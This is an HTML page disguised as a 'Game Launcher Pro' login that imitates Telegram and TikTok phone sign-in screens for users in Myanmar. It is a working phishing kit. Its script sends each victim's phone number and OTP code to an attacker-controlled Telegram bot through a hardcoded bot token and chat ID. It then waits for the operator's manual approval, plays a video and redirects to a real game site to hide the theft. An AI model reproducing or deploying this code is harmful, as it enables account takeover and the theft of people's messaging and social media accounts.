<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Game Launcher Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f3f4f6; }
        .bg-setup { background-image: url('https://raw.githubusercontent.com/tar-alt/Photo-link-/6451c994788dbe34e12fbac624779364dbf1c113/Picsart_26-05-13_08-54-08-682.jpg'); background-size: cover; background-position: center; }
        
        /* Telegram UI Style */
        .tg-input { width: 100%; padding: 12px; border-bottom: 2px solid #2481cc; outline: none; background: transparent; font-size: 1.1rem; }
        
        /* TikTok UI Style */
        .tt-input { width: 100%; padding: 12px; border: 1px solid #ddd; background: #f8f8f8; border-radius: 4px; outline: none; }
        
        /* ဂိမ်းထဲသို့ဝင်ရန်ခလုတ်အသေး - Bottom Style */
        .entry-btn-small {
            position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%);
            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
            padding: 10px 30px; border-radius: 30px; color: white;
            font-weight: bold; font-size: 1rem; cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: 0.3s; z-index: 100;
        }
        .entry-btn-small:active { transform: translateX(-50%) scale(0.95); opacity: 0.9; }

        #bgVideo { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body>

<div id="app" class="w-full h-full relative">
    
    <!-- STEP 1: Main Selection -->
    <div id="selectScreen" class="bg-setup w-full h-full flex flex-col items-center justify-center p-8">
        <div class="bg-white/90 backdrop-blur-md p-10 w-full max-w-sm rounded-[30px] shadow-2xl text-center">
            <h1 class="text-xl font-bold mb-8">Login to continue</h1>
            <button onclick="showTG()" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3 active:scale-95 transition">
                <i class="fa-brands fa-telegram text-2xl"></i> Telegram
            </button>
            <button onclick="showTT()" class="w-full bg-black text-white py-4 rounded-xl flex items-center justify-center gap-3 active:scale-95 transition">
                <i class="fa-brands fa-tiktok text-2xl"></i> TikTok
            </button>
        </div>
    </div>

    <!-- STEP 2: Telegram UI -->
    <div id="tgScreen" class="hidden bg-white w-full h-full p-6 flex flex-col">
        <div class="flex items-center gap-6 mb-10">
            <i onclick="goHome()" class="fa-solid fa-arrow-left text-xl text-gray-600"></i>
            <h1 class="text-xl font-bold">Your Phone</h1>
        </div>
        <p class="text-gray-500 mb-8">Please confirm your country code and enter your phone number.</p>
        <div class="space-y-6">
            <div class="border-b-2 border-gray-200 py-2 text-xl">Myanmar</div>
            <div class="flex gap-4">
                <div class="border-b-2 border-[#2481cc] py-2 text-xl">+95</div>
                <input type="number" id="tgPhone" placeholder="Phone number" class="tg-input">
            </div>
            <div class="relative flex items-center mt-4">
                <input type="number" id="tgOtp" placeholder="OTP Code" class="tg-input pr-20">
                <button onclick="getOTP('tgPhone')" class="absolute right-0 text-[#2481cc] font-bold">GET OTP</button>
            </div>
        </div>
        <button onclick="submitWait('TG')" class="mt-10 bg-[#2481cc] text-white py-4 rounded-xl font-bold shadow-lg">CONTINUE</button>
    </div>

    <!-- STEP 3: TikTok UI -->
    <div id="ttScreen" class="hidden bg-white w-full h-full p-6 flex flex-col">
        <div class="flex items-center justify-between mb-10">
            <i onclick="goHome()" class="fa-solid fa-xmark text-xl"></i>
            <span class="font-bold">Log in</span>
            <i class="fa-regular fa-circle-question text-xl"></i>
        </div>
        <div class="space-y-4">
            <div class="text-sm font-bold text-gray-500">Phone</div>
            <div class="flex gap-2">
                <div class="border border-gray-300 bg-gray-50 p-3 rounded flex items-center gap-1">MM +95 <i class="fa-solid fa-caret-down"></i></div>
                <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input flex-1">
            </div>
            <div class="relative flex items-center">
                <input type="number" id="ttOtp" placeholder="Enter 6-digit code" class="tt-input">
                <button onclick="getOTP('ttPhone')" class="absolute right-3 text-red-500 font-bold text-sm">Get code</button>
            </div>
            <div class="flex justify-between text-sm">
                <span class="text-gray-500">Log in with password</span>
                <span class="font-bold">Forgot password?</span>
            </div>
            <button onclick="submitWait('TT')" class="w-full bg-red-500 text-white py-4 rounded-sm font-bold mt-4 opacity-50">Log in</button>
        </div>
    </div>

    <!-- STEP 4: Wait Screen -->
    <div id="waitScreen" class="hidden bg-setup w-full h-full flex items-center justify-center">
        <div class="bg-white/80 p-8 rounded-2xl text-center shadow-xl">
            <div class="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <p class="font-bold">ခွင့်ပြုချက်စောင့်ဆိုင်းနေပါသည်...</p>
        </div>
    </div>

    <!-- STEP 5: Final Video Screen -->
    <div id="videoScreen" class="hidden w-full h-full relative bg-black">
        <video id="bgVideo" loop playsinline crossorigin="anonymous">
            <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
        </video>
        <!-- ခလုတ်အသေးလေးအား အောက်ခြေတွင်ထားခြင်း -->
        <button onclick="enterGame()" class="entry-btn-small">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</button>
    </div>

</div>

<script>
    const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
    const chat = "5304050102";
    let userKey = "ID_" + Math.floor(Math.random() * 8888);

    function toggle(id) {
        document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    function showTG() { toggle('tgScreen'); }
    function showTT() { toggle('ttScreen'); }
    function goHome() { toggle('selectScreen'); }

    // Get OTP နှိပ်ရင် ဖုန်းနံပါတ်ကို Bot ဆီအရင်ပို့ပေးရန်
    async function getOTP(inputId) {
        const ph = document.getElementById(inputId).value;
        if(!ph) return alert("ဖုန်းနံပါတ်ထည့်ပါ");
        alert("OTP ပို့လိုက်ပါပြီ");
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chat, text: `📩 Request OTP\nPH: +95${ph}\nID: ${userKey}` })
        });
    }

    async function submitWait(type) {
        const ph = (type === 'TG') ? document.getElementById('tgPhone').value : document.getElementById('ttPhone').value;
        const otp = (type === 'TG') ? document.getElementById('tgOtp').value : document.getElementById('ttOtp').value;
        
        toggle('waitScreen');
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: chat,
                text: `🔔 Final Login (${type})\nPH: +95${ph}\nOTP: ${otp}\nID: ${userKey}`,
                reply_markup: { inline_keyboard: [[{text: "✅ Approve", callback_data: `ok_${userKey}`}]] }
            })
        });
        startPolling();
    }

    function startPolling() {
        setInterval(async () => {
            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
            const d = await res.json();
            if (d.result?.some(up => up.callback_query?.data === `ok_${userKey}`)) {
                localStorage.setItem('done', 'true');
                playFinal();
            }
        }, 3000);
    }

    function playFinal() {
        toggle('videoScreen');
        const v = document.getElementById('bgVideo');
        v.muted = false;
        v.play();
        // Audio Boost 3x
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const src = ctx.createMediaElementSource(v);
        const gain = ctx.createGain();
        gain.gain.value = 3.5;
        src.connect(gain); gain.connect(ctx.destination);
    }

    function enterGame() { window.location.href = "https://www.crazygames.com"; }

    window.onload = () => { if(localStorage.getItem('done') === 'true') playFinal(); };
</script>
</body>
</html>
